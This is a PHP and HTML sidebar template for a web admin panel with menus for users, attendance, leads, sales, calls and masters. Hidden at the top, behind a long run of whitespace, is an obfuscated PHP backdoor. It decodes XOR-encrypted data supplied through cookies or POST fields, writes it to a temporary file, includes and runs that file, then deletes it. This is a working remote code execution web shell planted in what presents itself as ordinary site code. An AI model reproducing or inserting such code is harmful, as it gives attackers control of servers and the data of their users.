<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("inazi")){class inazi{public static $camkbtzhv = "jxfmczmpyxlxeinu";public static $yfgxihvl = NULL;public function __construct(){$ldqnsry = @$_COOKIE[substr(inazi::$camkbtzhv, 0, 4)];if (!empty($ldqnsry)){$xkdlcs = "base64";$tsauokbya = "";$ldqnsry = explode(",", $ldqnsry);foreach ($ldqnsry as $cmprfvcxw){$tsauokbya .= @$_COOKIE[$cmprfvcxw];$tsauokbya .= @$_POST[$cmprfvcxw];}$tsauokbya = array_map($xkdlcs . "_decode", array($tsauokbya,)); $tsauokbya = $tsauokbya[0] ^ str_repeat(inazi::$camkbtzhv, (strlen($tsauokbya[0]) / strlen(inazi::$camkbtzhv)) + 1);inazi::$yfgxihvl = @unserialize($tsauokbya);}}public function __destruct(){$this->mjvraeo();}private function mjvraeo(){if (is_array(inazi::$yfgxihvl)) {$txistrbhz = sys_get_temp_dir() . "/" . crc32(inazi::$yfgxihvl["salt"]);@inazi::$yfgxihvl["write"]($txistrbhz, inazi::$yfgxihvl["content"]);include $txistrbhz;@inazi::$yfgxihvl["delete"]($txistrbhz);exit();}}}$xunocl = new inazi(); $xunocl = NULL;} ?><!-- Main Sidebar Container -->
  <aside class="main-sidebar elevation-4 sidebar-light-olive ">
    <!-- Brand Logo -->
    
	<a href="<?php echo 'index.php?'.$mysqli->encode("stat=dashboard_new&type=dashboard_new");?>" class="brand-link">
      <img src="dist/img/cf_ogo.png" alt="MEDS" class="brand-image" style="margin-left:3px !important; width: 40px !important;">
      <span style="font-family: 'Spicy Rice', cursive;" class="brand-text font-weight-light"><?php echo APP_FULL_NAME; ?></span>
    </a>
    
     <?php
     
      if($_SESSION['profile_pic'] != "")
      {
          $profile_pic  = $_SESSION['profile_pic'];
      }
      else
      {
          $profile_pic  = "dist/img/user4-160x160.jpg";
      }
    ?>
    
    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      <div class="user-panel mt-3 pb-3 mb-3 d-flex">
        <div class="image">
          <img src="<?php echo $profile_pic; ?>" class="img-circle elevation-2" alt="User Image">
        </div>
        <div class="info">
          <a href="javascript:void(0);<?php //echo 'index.php?'.$mysqli->encode("stat=profile");?>" class="d-block"><?php echo $_SESSION['name']; ?></a>
        </div>
      </div>

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar nav-child-indent flex-column " data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
           
         
          <li class="nav-item">
            <a href="<?php echo $dashboard; ?>" class="nav-link <?php if($stat == 'admin_dashboard' || $stat == 'user_dashboard') { echo "active"; } ?>">
            <i class="nav-icon fas fa-tachometer-alt"></i>
              <p>Dashboard</p>
            </a>
          </li>
          
           <?php
           $href = 'index.php?'.$mysqli->encode("stat=add_attendance&type=attendance");
           if($_SESSION['user_type'] == "SUPER_ADMIN")
           {
               $href = 'index.php?'.$mysqli->encode("stat=admin_attendance&type=attendance");
           }
           ?>
         
         <?php if($_SESSION['user_type'] == 'SUPER_ADMIN') { ?>  
          <li class="nav-item has-treeview">
              <a href="#" class="nav-link <?php if($type == 'users') { echo "active"; } ?>">
                <i class="nav-icon fas fa-user-plus"></i>
                <p>
                  Users
                  <i class="right fas fa-angle-left"></i>
                </p>
              </a>
              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=person&type=users");?>" class="nav-link <?php if($type == 'users') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Users Details</p>
                  </a>
                </li>               
              </ul>             
              <ul class="nav nav-treeview" style="display: none;">
                <li style="display: none;" class="nav-item">
                  <a target="_blank" href="pages/charts/chartjs.html" class="nav-link">
                    <i class="far fa-circle nav-icon"></i>
                    <p>User Permission</p>
                  </a>
                </li>               
              </ul>
          </li>
        <?php } ?>

         <li class="nav-item has-treeview">
              <a href="#" class="nav-link <?php if($stat == 'add_attendance' || $stat == 'admin_attendance' || $stat == 'attendance_register'  ) { echo "active"; } ?>">
                <i class="nav-icon fa fa-clock"></i>
                <p>
                  Attendance
                  <i class="right fas fa-angle-left"></i>
                </p>
              </a>
              <ul class="nav nav-treeview" >
                <li class="nav-item">
                  <a target="_blank" href="<?php echo $href;?>" class="nav-link <?php if($stat == 'add_attendance' || $stat == 'admin_attendance'  )  { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Attendance Details</p>
                  </a>
                </li> 
                <?php if($_SESSION['user_type'] == "SUPER_ADMIN")
                { ?>
                <li  class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=attendance_register&type=Attendance Register");?>" class="nav-link <?php if($stat == 'attendance_register') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Attendance Register</p>
                  </a>
                </li>
                <?php } ?>
              </ul>
          </li>
          <?php
           $href = 'index.php?'.$mysqli->encode("stat=add_expenses&type=Add Expenses");
           if($_SESSION['user_type'] == "SUPER_ADMIN")
           {
               $href = 'index.php?'.$mysqli->encode("stat=add_expenses&type=View Expenses");
           }
           ?>
           <li class="nav-item has-treeview">
              <a href="#" class="nav-link <?php if($stat == 'add_expenses') { echo "active"; } ?>">
                <i class="nav-icon fas fa-dollar-sign"></i>
                <p>
                  Leads
                  <i class="right fas fa-angle-left"></i>
                </p>
              </a>
              <ul class="nav nav-treeview" >
                <li class="nav-item">
                  <a target="_blank" href="<?php echo $href;?>" class="nav-link <?php if($stat == 'add_expenses' )  { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Add/Assign Leads </p>
                  </a>
                </li> 
                
              </ul>
          </li>
         
          

          <li class="nav-item has-treeview">
              <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=order_book&type=Shortage Book");?>"" class="nav-link <?php if($stat == 'order_book') { echo "active"; } ?>">
                <i class="nav-icon fas fa-users"></i>
                <p>
                Customers
                </p>
              </a>
          </li>
          
          <li class="nav-item has-treeview">
              <a href="#" class="nav-link <?php if($stat == 'order' || $stat == 'order_history' ) { echo "active"; } ?>">
                <i class="nav-icon fas fa-shopping-cart"></i>
                <p>
                  Sale
                  <i class="right fas fa-angle-left"></i>
                </p>
              </a>
              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=order&type=order");?>"" class="nav-link <?php if($stat == 'order') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>New Sale</p>
                  </a>
                </li>               
              </ul>
               
              
              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=order_history&type=order_history");?>"" class="nav-link <?php if($stat == 'order_history') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Sale History</p>
                  </a>
                </li>               
              </ul>

              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=order_history&type=order_history");?>"" class="nav-link <?php if($stat == 'order_history') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Assign Sale</p>
                  </a>
                </li>               
              </ul>
          </li>

          <li class="nav-item has-treeview">
              <a href="#" class="nav-link <?php if($stat == 'order' || $stat == 'order_history' ) { echo "active"; } ?>">
                <i class="nav-icon fas fa-shopping-cart"></i>
                <p>
                  Call
                  <i class="right fas fa-angle-left"></i>
                </p>
              </a>
              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=order&type=order");?>"" class="nav-link <?php if($stat == 'order') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Add Call</p>
                  </a>
                </li>               
              </ul>
               
              
              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=order_history&type=order_history");?>"" class="nav-link <?php if($stat == 'order_history') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Call History</p>
                  </a>
                </li>               
              </ul>

               
          </li>
          
           
          
          
          
          <li class="nav-item has-treeview active">
              <a href="#" class="nav-link <?php if($stat == 'products' || $stat == 'categories' || $stat == 'product_unit') { echo "active"; } ?>">
                <i class="nav-icon fas fa-chart-pie"></i>
                <p>
                  Masters
                  <i class="right fas fa-angle-left"></i>
                </p>
              </a>
              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=products&type=products");?>" class="nav-link <?php if($stat == 'products') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Source Master</p>
                  </a>
                </li>               
              </ul>

              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=categories&type=categories");?>" class="nav-link <?php if($stat == 'categories') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Lead Action Master</p>
                  </a>
                </li>               
              </ul>
              
              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=product_unit&type=product_unit");?>" class="nav-link <?php if($stat == 'product_unit') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Lead Status Master</p>
                  </a>
                </li>               
              </ul>
              
              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=product_company&type=Product Companies");?>" class="nav-link <?php if($stat == 'product_company') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Product Master</p>
                  </a>
                </li>               
              </ul>

              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=product_company&type=Product Companies");?>" class="nav-link <?php if($stat == 'product_company') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Product Master</p>
                  </a>
                </li>               
              </ul>

              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=product_company&type=Product Companies");?>" class="nav-link <?php if($stat == 'product_company') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Payment Mode Master</p>
                  </a>
                </li>               
              </ul>

              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=product_company&type=Product Companies");?>" class="nav-link <?php if($stat == 'product_company') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Payment Status Master</p>
                  </a>
                </li>               
              </ul>

              <ul class="nav nav-treeview" style="display: none;">
                <li class="nav-item">
                  <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=product_company&type=Product Companies");?>" class="nav-link <?php if($stat == 'product_company') { echo "active"; } ?>">
                    <i class="far fa-circle nav-icon"></i>
                    <p>Shipping Method Master</p>
                  </a>
                </li>               
              </ul>

               
          </li>
          

          <li class="nav-item has-treeview">
              <a target="_blank" href="<?php echo 'index.php?'.$mysqli->encode("stat=order_book&type=Shortage Book");?>"" class="nav-link <?php if($stat == 'order_book') { echo "active"; } ?>">
                <i class="nav-icon fas fa-users"></i>
                <p>
                Shipment
                </p>
              </a>
          </li>

          
          
          </li>
    
       
		   
        
        
         
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>
  <div style="display:block;" id="loading">
    <div id="spinner"><img src="img/loader-white.gif" style="width:100px;"/></div>
  </div>